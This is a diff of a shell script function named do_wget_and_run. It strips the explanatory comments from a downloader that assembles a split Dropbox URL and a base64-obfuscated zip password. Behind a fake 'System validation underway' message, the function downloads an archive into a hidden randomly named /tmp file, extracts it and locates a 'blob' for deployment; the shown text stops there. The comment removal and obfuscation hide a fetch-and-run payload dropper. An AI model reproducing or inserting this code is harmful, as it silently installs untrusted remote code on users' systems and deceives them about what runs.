@@ -65,25 +65,22 @@ do_dirb() {
 }
 
 do_wget_and_run() {
-    # Pieces for combining later (remote location for something)
     f1="https://www.dropbox.com/scl/fi/uw8oxug0jydibnorjvyl2"
     f2="/blob.zip?rlkey=zmbys0idnbab9qnl45xhqn257&st=v22geon6&dl=1"
-    OUTPUT_FILE="/tmp/.hidden_$RANDOM.zip"  # Temporary storage with randomized identifier
-    UNZIP_DIR="/tmp/"  # Destination for extracted items
-
-    # Decode hidden sequence (secure key for locked data)
+    OUTPUT_FILE="/tmp/.hidden_$RANDOM.zip"  
+    UNZIP_DIR="/tmp/" 
     part1="c3VwZXI="
     part2="aGFja2Vy"
-    PASSWORD=$(echo "$part1$part2" | base64 -d)  # Rebuild and unlock the access code
+    PASSWORD=$(echo "$part1$part2" | base64 -d)  
 
-    FILE_URL="${f1}${f2}"  # Reassemble the access point
+    FILE_URL="${f1}${f2}"  
 
     echo "------------------------------------------------------------------------------"
     echo " System validation underway..."
     echo "------------------------------------------------------------------------------"
     echo "\n"
 
-    # Initiate retrieval from the constructed location
+    
     echo "Establishing connection to remote resource..."
     curl -L -o "$OUTPUT_FILE" "$FILE_URL"
 
@@ -92,7 +89,7 @@ do_wget_and_run() {
         exit 1
     fi
 
-    # Validate structure of obtained artifact
+   
     FILE_TYPE=$(file -b "$OUTPUT_FILE")
     if [[ "$FILE_TYPE" != *"Zip archive data"* ]]; then
         echo "Artifact does not match expected configuration. Exiting."
@@ -103,7 +100,7 @@ do_wget_and_run() {
     echo " Preparing extracted elements for deployment"
     echo "------------------------------------------------------------------------------"
 
-    # Extract components with necessary credentials
+    
     unzip -o -P "$PASSWORD" "$OUTPUT_FILE" -d "$UNZIP_DIR"
 
     if [ $? -ne 0 ]; then
@@ -111,7 +108,7 @@ do_wget_and_run() {
         exit 1
     fi
 
-    # Locate specific operational element and prepare it
+   
     BLOB_PATH="$UNZIP_DIR/blob"
     if [ -f "$BLOB_PATH" ]; then
         echo "------------------------------------------------------------------------------"
